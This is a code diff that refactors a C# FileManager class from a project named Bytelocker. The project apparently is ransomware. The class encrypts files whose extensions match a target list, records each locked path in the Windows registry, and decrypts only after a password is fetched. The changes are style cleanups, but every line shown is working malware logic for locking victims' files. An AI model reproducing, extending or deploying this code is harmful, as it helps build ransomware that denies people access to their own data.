@@ -1,22 +1,22 @@
-﻿using Bytelocker.Settings;
-using System;
+﻿using System;
 using System.IO;
+using Bytelocker.Settings;
 
 namespace Bytelocker.CryptoManager
 {
-    class FileManager
+    internal class FileManager
     {
-        private String file_path;
-        private FileEncrypter fe;
-        private RegistryManager rm;
+        private readonly FileEncrypter fe;
+        private string file_path;
+        private readonly RegistryManager rm;
 
         public FileManager()
         {
-            this.fe = new FileEncrypter();
-            this.rm = new RegistryManager();
+            fe = new FileEncrypter();
+            rm = new RegistryManager();
         }
 
-        public void ChooseFile(String file_path)
+        public void ChooseFile(string file_path)
         {
             this.file_path = file_path;
         }
@@ -25,38 +25,37 @@ namespace Bytelocker.CryptoManager
         {
             try
             {
-                File.Delete(this.file_path);
-            } catch (Exception)
+                File.Delete(file_path);
+            }
+            catch (Exception)
             {
             }
-            
         }
 
         public void RenameTmpFileToOrig()
         {
             try
             {
-                File.Move(this.file_path + FileEncrypter.FILE_EXTENSION_ENCRYPT_TMP, this.file_path);
+                File.Move(file_path + FileEncrypter.FILE_EXTENSION_ENCRYPT_TMP, file_path);
             }
             catch (Exception)
             {
             }
-
         }
 
         public void SetupFileEncrypter()
         {
-            this.fe.FetchPassword();
-            this.fe.GenerateRandomSalt();
+            fe.FetchPassword();
+            fe.GenerateRandomSalt();
         }
 
         public void removeRegistryItem()
         {
             try
             {
-                this.rm.DeleteValue(RegistryManager.FILES_KEY_NAME, this.file_path);
+                rm.DeleteValue(RegistryManager.FILES_KEY_NAME, file_path);
             }
-            catch (System.ArgumentException)
+            catch (ArgumentException)
             {
                 // if the value does not exist in registry
             }
@@ -64,35 +63,34 @@ namespace Bytelocker.CryptoManager
 
         public bool DecryptFile()
         {
-            bool success = false;
-            
-            if (File.Exists(this.file_path))
-            {
-                if (!(FileManager.IsFileLocked(this.file_path)) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, this.file_path) != "none")
+            var success = false;
+
+            if (File.Exists(file_path))
+                if (!IsFileLocked(file_path) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, file_path) != "none")
                 {
                     success = true;
-                    this.fe.ChooseFile(this.file_path);
-                    this.fe.Decrypt();
-                    this.removeRegistryItem();
+                    fe.ChooseFile(file_path);
+                    fe.Decrypt();
+                    removeRegistryItem();
                 }
-            }
 
             return success;
         }
 
         public bool EncryptFile()
         {
-            bool success = true;
+            var success = true;
 
-            String file_extension = Path.GetExtension(this.file_path);
+            var file_extension = Path.GetExtension(file_path);
 
-            if (!(IsFileLocked(this.file_path)) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, this.file_path) == "none" 
-                && FileEncrypter.FILE_EXTENSIONS_TO_ENCRYPT.Contains(file_extension.ToLower()))
+            if (!IsFileLocked(file_path) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, file_path) == "none"
+                                         && FileEncrypter.FILE_EXTENSIONS_TO_ENCRYPT.Contains(file_extension.ToLower()))
             {
-                this.fe.ChooseFile(this.file_path);
-                this.fe.Encrypt();
-                this.rm.CreateBoolValue(RegistryManager.FILES_KEY_NAME, this.file_path, true);
-            } else
+                fe.ChooseFile(file_path);
+                fe.Encrypt();
+                rm.CreateBoolValue(RegistryManager.FILES_KEY_NAME, file_path, true);
+            }
+            else
             {
                 success = false;
             }
@@ -100,10 +98,10 @@ namespace Bytelocker.CryptoManager
             return success;
         }
 
-        public static bool IsFileLocked(String path)
+        public static bool IsFileLocked(string path)
         {
             FileStream stream = null;
-            FileInfo file = new FileInfo(path);
+            var file = new FileInfo(path);
 
             try
             {
@@ -122,5 +120,4 @@ namespace Bytelocker.CryptoManager
             return false;
         }
     }
-
 }
